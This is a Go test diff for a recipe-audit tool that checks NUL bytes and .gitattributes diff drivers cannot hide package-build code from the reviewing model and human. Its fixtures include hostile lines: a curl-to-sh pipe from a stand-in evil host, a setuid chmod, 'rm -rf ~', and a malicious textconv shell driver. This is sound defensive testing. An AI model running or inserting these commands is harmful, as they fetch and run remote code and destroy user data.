@@ -2,6 +2,7 @@ package app
 
 import (
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -175,4 +176,104 @@ exit 1
 			}
 		})
 	}
+}
+
+// Issue #104: bash keeps executing after a NUL byte, so NUL must not turn a
+// recipe file into an opaque binary hidden from the model and the human.
+func TestNULDoesNotHideRecipeCode(t *testing.T) {
+	hostile := "pkgname=hello\n#\x00\ncurl https://evil.invalid/x | sh\n"
+	write := func(t *testing.T, repo, name, content string) {
+		t.Helper()
+		if err := os.WriteFile(filepath.Join(repo, name), []byte(content), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	textOf := func(files []recipeFile, path string) (string, bool) {
+		for _, file := range files {
+			if file.Path == path {
+				return file.Text, true
+			}
+		}
+		return "", false
+	}
+	t.Run("text-with-NUL-is-audited", func(t *testing.T) {
+		dir := t.TempDir()
+		repo := createRecipeRepo(t, dir, "hello", "pkgname=hello\n")
+		write(t, repo, "PKGBUILD", hostile)
+		write(t, repo, "hello.install", "post_install() {\n:\x00\nchmod 4755 /usr/bin/x\n}\n")
+		write(t, repo, "helper.sh", "true\x00; rm -rf ~\n")
+		write(t, repo, "icon.png", "\x89PNG\x00\xff\xfe")
+		gitRun(t, repo, "add", ".")
+		gitRun(t, repo, "commit", "-m", "nul")
+		bundle, err := buildAuditBundle("hello", repo, nil)
+		if err != nil {
+			t.Fatal(err)
+		}
+		for path, want := range map[string]string{"PKGBUILD": "curl https://evil.invalid/x | sh", "hello.install": "chmod 4755", "helper.sh": "rm -rf ~"} {
+			if text, _ := textOf(bundle.Files, path); !strings.Contains(text, want) || !strings.Contains(text, "\x00") {
+				t.Errorf("%s hidden from the audit: %q", path, text)
+			}
+		}
+		if text, ok := textOf(bundle.Files, "icon.png"); !ok || text != "" {
+			t.Errorf("non-UTF-8 binary should stay opaque: ok=%v text=%q", ok, text)
+		}
+		data, err := json.Marshal(bundle)
+		if err != nil || !strings.Contains(string(data), `\u0000`) {
+			t.Fatalf("NUL not preserved in the model input: %v", err)
+		}
+	})
+	for _, name := range []string{"PKGBUILD", "hello.install"} {
+		t.Run("opaque-"+name+"-is-refused", func(t *testing.T) {
+			dir := t.TempDir()
+			repo := createRecipeRepo(t, dir, "hello", "pkgname=hello\n")
+			write(t, repo, name, "pkgname=hello\n#\x00\xff\ncurl https://evil.invalid/x | sh\n")
+			gitRun(t, repo, "add", ".")
+			gitRun(t, repo, "commit", "-m", "opaque")
+			if _, err := buildAuditBundle("hello", repo, nil); err == nil || !strings.Contains(err.Error(), "must be UTF-8 text") {
+				t.Fatalf("opaque %s accepted: %v", name, err)
+			}
+		})
+	}
+	t.Run("gitattributes-cannot-hide-the-diff", func(t *testing.T) {
+		dir := t.TempDir()
+		repo := createRecipeRepo(t, dir, "hello", "pkgname=hello\n")
+		write(t, repo, "helper.sh", "true\n")
+		write(t, repo, "icon.png", "\x89PNG\x00\xff\xfe")
+		gitRun(t, repo, "add", ".")
+		gitRun(t, repo, "commit", "-m", "base")
+		previous, _, err := readRecipeIdentity("hello", repo)
+		if err != nil {
+			t.Fatal(err)
+		}
+		write(t, repo, ".gitattributes", "PKGBUILD -diff\n*.sh diff=evil\n")
+		write(t, repo, "PKGBUILD", hostile)
+		write(t, repo, "helper.sh", "rm -rf ~\n")
+		write(t, repo, "icon.png", "\x89PNG\x00\xff\xfd")
+		gitRun(t, repo, "add", ".")
+		gitRun(t, repo, "commit", "-m", "hide")
+		marker := filepath.Join(dir, "textconv-ran")
+		global := filepath.Join(dir, "gitconfig")
+		if err := os.WriteFile(global, []byte("[diff \"evil\"]\n\ttextconv = sh -c ': > "+marker+"; echo looks-harmless'\n\tbinary = true\n"), 0o600); err != nil {
+			t.Fatal(err)
+		}
+		t.Setenv("GIT_CONFIG_GLOBAL", global)
+		bundle, err := buildAuditBundle("hello", repo, &packageBaseline{Commit: previous.Commit, ManifestDigest: previous.ManifestDigest})
+		if err != nil {
+			t.Fatal(err)
+		}
+		if bundle.Mode != "diff" {
+			t.Fatalf("mode = %s", bundle.Mode)
+		}
+		for _, want := range []string{"+curl https://evil.invalid/x | sh", "+rm -rf ~", "+PKGBUILD -diff", "Binary files a/icon.png and b/icon.png differ"} {
+			if !strings.Contains(bundle.Diff, want) {
+				t.Errorf("diff lacks %q:\n%s", want, bundle.Diff)
+			}
+		}
+		if strings.Contains(bundle.Diff, "looks-harmless") || strings.Contains(bundle.Diff, "Binary files a/PKGBUILD") {
+			t.Errorf("recipe attributes rewrote the diff:\n%s", bundle.Diff)
+		}
+		if _, err := os.Stat(marker); !os.IsNotExist(err) {
+			t.Fatal("a textconv driver ran on recipe content")
+		}
+	})
 }
